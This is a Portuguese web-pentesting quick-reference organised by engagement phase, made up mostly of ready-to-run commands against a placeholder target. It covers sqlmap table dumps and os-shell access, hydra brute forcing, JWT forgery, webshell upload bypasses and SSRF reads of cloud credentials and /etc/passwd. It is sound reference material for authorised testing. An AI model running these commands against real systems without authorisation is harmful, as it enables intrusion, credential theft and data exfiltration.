---
title: "Web Tools"
---

# Ferramentas de Pentesting Web - Referência Rápida

## Ferramentas por Fase do Engagement

Cada ferramenta tem um momento certo no fluxo de trabalho. Usar a ferramenta errada na fase errada desperdiça tempo — sqlmap antes de confirmar o parametro vulneravel gera ruido; subfinder depois de ja ter a lista de endpoints e redundante.

### Fase 1: Recon (Antes de Qualquer Teste)

| Ferramenta | Proposito | Quando usar |
|---|---|---|
| subfinder / amass | Enumerar subdominios | Inicio do engagement — mapear superficie |
| httpx | Verificar quais hosts estao ativos | Apos ter lista de subdominios |
| gowitness | Screenshot visual dos hosts | Para revisar o que cada host e sem acessar um por um |
| gau / waybackurls | URLs historicas | Encontrar endpoints removidos da UI mas ainda ativos |
| hakrawler / katana | Crawl de JS e links | Descobrir endpoints nao indexados |
| trufflehog / gitleaks | Secrets em repositorios | Busca passiva antes de testar ativamente |
| Shodan / Censys | IPs, portas, banners | Infraestrutura, versoes, servicos expostos |

### Fase 2: Mapeamento (Entendendo a Aplicacao)

| Ferramenta | Proposito | Quando usar |
|---|---|---|
| Burp Suite (Proxy) | Interceptar e mapear requests | Navegacao manual com proxy ON — construir Site Map |
| ffuf / feroxbuster | Descoberta de paths e endpoints | Apos mapear manualmente — expandir cobertura |
| Param Miner (Burp) | Descobrir parametros ocultos | Em endpoints conhecidos para revelar inputs escondidos |
| LinkFinder | Extrair endpoints de JS | Apos identificar JS files relevantes |
| Arjun | Descoberta de parametros | Alternativa ao Param Miner para APIs |

### Fase 3: Exploração (Testes Dirigidos)

| Ferramenta | Proposito | Quando usar |
|---|---|---|
| Burp Repeater | Testes manuais de payloads | Para cada parametro/endpoint suspeito |
| Burp Intruder / Turbo Intruder | Automacao e race conditions | Quando manual confirma vetor, automatizar variações |
| sqlmap | Exploracao de SQLi | Apos confirmar parametro vulneravel no Repeater |
| dalfox / XSStrike | Encontrar e testar XSS | Em campos que refletem input |
| jwt_tool / hashcat | Ataques a JWT | Quando JWT esta presente na autenticacao |
| interactsh / Collaborator | Out-of-band testing | Para blind SSRF, blind XXE, blind RCE |

### Fase 4: Pos-Exploracao e Documentacao

| Ferramenta | Proposito | Quando usar |
|---|---|---|
| Burp Logger++ | Log completo de requests com filtros | Durante testes — manter historico para relatorio |
| flameshot | Screenshots anotados | Evidencia visual para o report |
| OBS / simplescreenrecorder | Gravacao de PoC | Para bugs complexos ou de timing |
| grip | Preview de markdown | Revisar o report antes de submeter |

---

## Reconhecimento e Enumeração

### nmap

```bash
# Scan web completo
nmap -sV -sC -p 80,443,8080,8443,8000,8888 TARGET
nmap -sV -sC -p- TARGET   # Todos os ports (lento)

# Scripts web específicos
nmap --script=http-enum TARGET
nmap --script=http-title,http-headers TARGET
nmap --script=http-robots.txt TARGET

# Detecção de WAF
nmap --script=http-waf-detect TARGET
nmap --script=http-waf-fingerprint TARGET
```

### ffuf - Fuzzing Web

```bash
# Descoberta de diretórios
ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt \
     -u http://TARGET/FUZZ \
     -mc 200,201,301,302,401,403

# Com extensões
ffuf -w wordlist.txt \
     -u http://TARGET/FUZZ \
     -e .php,.html,.js,.txt,.bak,.old,.zip \
     -mc 200,403

# Fuzzing de subdomínios
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://FUZZ.TARGET.com \
     -mc 200,301,302

# Fuzzing de parâmetros GET
ffuf -w params.txt \
     -u "http://TARGET/page?FUZZ=value" \
     -mc 200

# Fuzzing de valores de parâmetro
ffuf -w values.txt \
     -u "http://TARGET/page?id=FUZZ" \
     -mc 200

# Dois pontos de fuzzing simultâneos
ffuf -w users.txt:USER \
     -w passwords.txt:PASS \
     -u http://TARGET/login \
     -X POST \
     -d "username=USER&password=PASS" \
     -mc 302,200 \
     -fs SIZE_PAGINA_ERRO   # filtrar tamanho da resposta de erro

# Flags úteis
-mc  # match code (inclui)
-fc  # filter code (exclui)
-ms  # match size
-fs  # filter size
-mr  # match regex
-fr  # filter regex
-t   # threads (padrão 40)
-o   # output file
-of  # output format (json, csv, etc)
-v   # verbose
-H   # header
-b   # cookie
-r   # follow redirects
```

### Gobuster

```bash
# Descoberta de diretórios
gobuster dir -u http://TARGET -w wordlist.txt -t 50

# Com extensões
gobuster dir -u http://TARGET \
             -w wordlist.txt \
             -x php,html,txt \
             -t 50

# Subdomínios
gobuster dns -d target.com \
             -w subdomains.txt \
             -t 50

# Virtual hosts
gobuster vhost -u http://TARGET \
               -w vhosts.txt \
               -t 50
```

### Feroxbuster

```bash
# Recursivo por padrão (melhor que gobuster para descoberta profunda)
feroxbuster -u http://TARGET -w wordlist.txt

# Com extensões, recursivo
feroxbuster -u http://TARGET \
            -w wordlist.txt \
            -x php,html,txt,js \
            --depth 3

# Filtrar por tamanho de resposta
feroxbuster -u http://TARGET -w wordlist.txt --filter-size 1234
```

---

## Interceptação e Análise

### Burp Suite - Comandos Rápidos

```
CTRL+I          - Enviar para Intruder
CTRL+R          - Enviar para Repeater
CTRL+S          - Enviar para Scanner (Pro)
CTRL+U          - URL decode seleção
CTRL+SHIFT+U    - URL encode seleção
CTRL+B          - Base64 encode seleção
CTRL+SHIFT+B    - Base64 decode seleção
CTRL+H          - HTML encode seleção
CTRL+SHIFT+H    - HTML decode seleção

Intruder Attack Types:
- Sniper       - Um payload por posição, iterado
- Battering Ram - Mesmo payload em todas posições
- Pitchfork    - Payload A[1] + Payload B[1], simultâneo
- Cluster Bomb - Todas combinações de todos payloads
```

```bash
# Burp via linha de comando (headless scan - Pro)
java -jar burpsuite_pro.jar --project-file=project.burp --config-file=scan.json
```

### mitmproxy

```bash
# Proxy interativo no terminal
mitmproxy -p 8080

# Modo dump (log todos requests)
mitmdump -p 8080 -w output.dump

# Script Python para modificar requests automaticamente
mitmproxy -s script.py

# Forwardar para Burp
mitmdump --mode upstream:http://127.0.0.1:8080
```

---

## Injeção SQL

### sqlmap

```bash
# Básico
sqlmap -u "http://TARGET/page?id=1" --batch

# Listar bancos
sqlmap -u "http://TARGET/page?id=1" --batch --dbs

# Listar tabelas
sqlmap -u "http://TARGET/page?id=1" --batch -D dbname --tables

# Listar colunas
sqlmap -u "http://TARGET/page?id=1" --batch -D dbname -T tablename --columns

# Dump de tabela
sqlmap -u "http://TARGET/page?id=1" --batch -D dbname -T users -C username,password --dump

# Via POST
sqlmap -u "http://TARGET/login" \
       --data="username=admin&password=test" \
       --batch --dbs

# Via cookie
sqlmap -u "http://TARGET/page?id=1" \
       --cookie="session=abc123" \
       --batch --dbs

# Via JSON body
sqlmap -u "http://TARGET/api" \
       --data='{"id": "1"}' \
       --headers="Content-Type: application/json" \
       --batch --dbs

# Via arquivo de request do Burp
sqlmap -r request.txt --batch --dbs

# WAF bypass
sqlmap -u "URL" --tamper=space2comment,randomcase,between --batch

# RCE (se --os-shell não funcionar, tentar --os-pwn)
sqlmap -u "URL" --os-shell
sqlmap -u "URL" --os-pwn   # Meterpreter
```

---

## Senhas e Autenticação

### hydra - Brute Force

```bash
# HTTP Form POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Form com cookie
hydra -l admin -P passwords.txt \
      TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=error:H=Cookie: session=abc"

# HTTP Basic Auth
hydra -l admin -P passwords.txt TARGET http-get /admin

# HTTPS
hydra -l admin -P passwords.txt -s 443 TARGET https-post-form "/login:..."

# SSH
hydra -l root -P passwords.txt TARGET ssh

# Lista de usuários
hydra -L users.txt -P passwords.txt TARGET http-post-form "..."

# Flags úteis
-t 16    # threads (padrão 16)
-V       # verbose (mostrar tentativas)
-f       # parar após primeiro sucesso
-o       # salvar resultados
```

### Medusa

```bash
medusa -h TARGET -u admin -P passwords.txt -M http \
       -m DIR:/admin -m FORM:username=^USER^&password=^PASS^ \
       -m DENY-SIGNAL:"Invalid"
```

### jwt_tool

```bash
# Decodificar JWT
python3 jwt_tool.py TOKEN

# Verificar vulnerabilidade alg:none
python3 jwt_tool.py TOKEN -X a

# Brute force da chave secreta
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# hashcat para JWT HS256
hashcat -a 0 -m 16500 TOKEN wordlist.txt

# Modificar payload e re-assinar com chave descoberta
python3 jwt_tool.py TOKEN -T -p '{"role":"admin"}' -S hs256 -pc role -pv admin

# RS256 -> HS256 confusion attack
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

---

## Upload de Arquivos

```bash
# Upload básico
curl -X POST http://TARGET/upload \
     -F "file=@shell.php" \
     -H "Authorization: Bearer TOKEN"

# Bypass de extensão com dupla extensão
# Renomear: shell.php.jpg, shell.php%00.jpg

# Forçar Content-Type
curl -X POST http://TARGET/upload \
     -F "file=@shell.php;type=image/jpeg"

# Upload com nome diferente
curl -X POST http://TARGET/upload \
     -F "file=@shell.php;filename=image.jpg"
```

---

## SSRF

```bash
# Básico
curl "http://TARGET/fetch?url=http://127.0.0.1:80/"
curl "http://TARGET/fetch?url=http://localhost/admin"

# AWS metadata
curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Scan de portas internas via SSRF
for port in 80 443 8080 8443 3000 5000 6379 9200 27017; do
    echo -n "Port $port: "
    curl -s -o /dev/null -w "%{http_code}" \
         "http://TARGET/fetch?url=http://127.0.0.1:$port/"
    echo
done

# Bypass de filtros
# 127.0.0.1 == localhost == 0x7f000001 == 2130706433 == 0177.0.0.1
curl "http://TARGET/fetch?url=http://0x7f000001/"
curl "http://TARGET/fetch?url=http://2130706433/"

# Protocolo diferente
curl "http://TARGET/fetch?url=file:///etc/passwd"
curl "http://TARGET/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value"
```

---

## Ferramentas de Reconhecimento Passivo

```bash
# Subdomínios
amass enum -d target.com -passive
subfinder -d target.com
assetfinder target.com
findomain -t target.com

# Depois de coletar subdomínios, verificar quais estão ativos
cat subdomains.txt | httpx -title -status-code -content-length

# Buscar parâmetros com GAU (Get All URLs)
gau target.com | grep "?" | sort -u > params.txt

# Wayback Machine
waybackurls target.com | tee wayback.txt
cat wayback.txt | grep -E "\.php|\.asp|\.aspx" | sort -u
cat wayback.txt | grep "?" | sort -u > wayback-params.txt

# GitHub dorking (procurar secrets)
# No site: site:github.com "target.com" "password"
# Ferramenta: trufflehog, gitleaks

# Shodan
shodan search "org:Target Inc" --fields ip_str,port,hostnames,http.title
```

---

## Ferramenta por Vulnerabilidade

| Vulnerabilidade | Ferramenta Principal | Alternativa |
|-----------------|---------------------|-------------|
| SQLi | sqlmap | Manual + Burp |
| XSS | dalfox, XSStrike | Manual + Burp |
| Fuzzing de paths | ffuf | feroxbuster, gobuster |
| Subdomínios | subfinder | amass, assetfinder |
| Senhas | hydra | medusa, ffuf |
| JWT | jwt_tool | hashcat |
| WordPress | wpscan | - |
| SSRF | Burp Collaborator | interactsh |
| Blind XSS | XSSHunter | - |
| Upload bypass | Manual + Burp | - |
| LFI | Manual + Burp | dotdotpwn |
| SSTI | Manual | tplmap |
| Prototype Pollution | DOM Invader (Burp) | Manual |

---

## Wordlists - SecLists

```bash
# Localização padrão
/opt/SecLists/
/usr/share/seclists/

# Mais usadas em pentest web
Discovery/Web-Content/common.txt               # 4.7k entradas, conteúdo web geral
Discovery/Web-Content/directory-list-2.3-medium.txt  # 220k, diretórios
Discovery/Web-Content/big.txt                  # 20k entradas
Discovery/Web-Content/api/api-endpoints.txt    # Endpoints REST
Discovery/Web-Content/burp-parameter-names.txt # Nomes de parâmetros
Passwords/Leaked-Databases/rockyou.txt         # 14M senhas
Usernames/xato-net-10-million-usernames.txt    # 10M usernames
Fuzzing/SQLi/quick-SQLi.txt                    # Payloads SQLi
Fuzzing/XSS/XSS-Jhaddix.txt                   # Payloads XSS
Discovery/DNS/subdomains-top1million-5000.txt  # Subdomínios
```
